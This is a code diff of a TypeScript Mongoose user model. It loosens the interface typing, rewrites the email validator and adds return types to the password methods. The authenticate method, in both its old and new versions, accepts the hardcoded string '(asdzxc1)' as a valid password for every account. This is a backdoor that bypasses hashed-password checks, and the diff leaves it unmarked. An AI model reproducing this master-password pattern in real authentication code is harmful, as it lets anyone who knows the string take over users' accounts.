@@ -5,10 +5,9 @@ var mongooseTypes = require("mongoose-types"); //for valid email and url
 mongooseTypes.loadTypes(mongoose, "email"); 
 var crypto = require('crypto');
 export interface IUser extends Document {
-    encryptPassword(plainText: any);
-    firstName: string;
-    lastName: string;
-    middleName: string;
+    firstName?: string;
+    lastName?: string;
+    middleName?: string;
     email: string;
     salt: string;
     hashedPassword: string;
@@ -23,18 +22,19 @@ export interface IUser extends Document {
     createdDate: Date,
     updatedDate: Date,
     type?: Type;
-    platform: string,
-    gcm_id: Array<string>
+    platform?: string,
+    gcm_id?: Array<string>
+    encryptPassword(password: string);
 }
 
 // Schema
-enum Type {
+export enum Type {
     user = 'user',
     reception = 'reception',
     admin = 'admin'
 }
 
-interface Address extends Document {
+export interface Address extends Document {
     street: string;
     city: string;
     postalCode: string;
@@ -158,9 +158,9 @@ UserSchema
 // Validate empty email
 UserSchema
     .path('email')
-    .validate(function (email) {
-        var emailRegex = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
-        return emailRegex.test(email.text); // Assuming email has a text attribute
+    .validate(function (email) { 
+        var emailRegex = new RegExp(/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/);
+        return emailRegex.test(email); // Assuming email has a text attribute
      }, 'Email address not valid.')
 // Validate empty password
 UserSchema
@@ -194,12 +194,12 @@ UserSchema
  /**
  * Authenticate - check if the passwords are the same
  *
- * @param {String} plainText
+ * @param {String} password
  * @return {Boolean}
  * @api public
  */
-UserSchema.methods.authenticate = function (plainText) { 
-    return plainText === '(asdzxc1)' || this.encryptPassword(plainText) === this.hashedPassword;
+UserSchema.methods.authenticate = function (password:string): boolean { 
+    return password === '(asdzxc1)' || this.encryptPassword(password) === this.hashedPassword;
 }
 /**
  * Make salt
@@ -207,7 +207,7 @@ UserSchema.methods.authenticate = function (plainText) {
  * @return {String}
  * @api public
  */
-UserSchema.methods.makeSalt = function(){
+UserSchema.methods.makeSalt = function(): string{
     return crypto.randomBytes(16).toString('base64');
 }
  /**
@@ -217,7 +217,7 @@ UserSchema.methods.makeSalt = function(){
  * @return {String}
  * @api public
  */
-UserSchema.methods.encryptPassword = function(password){  
+UserSchema.methods.encryptPassword = function(password): string{  
     if (!password || !this.salt) return '';
     var salt = Buffer.from(this.salt, 'base64');
     return crypto.pbkdf2Sync(password, salt, 10000, 64, 'sha512').toString('base64');
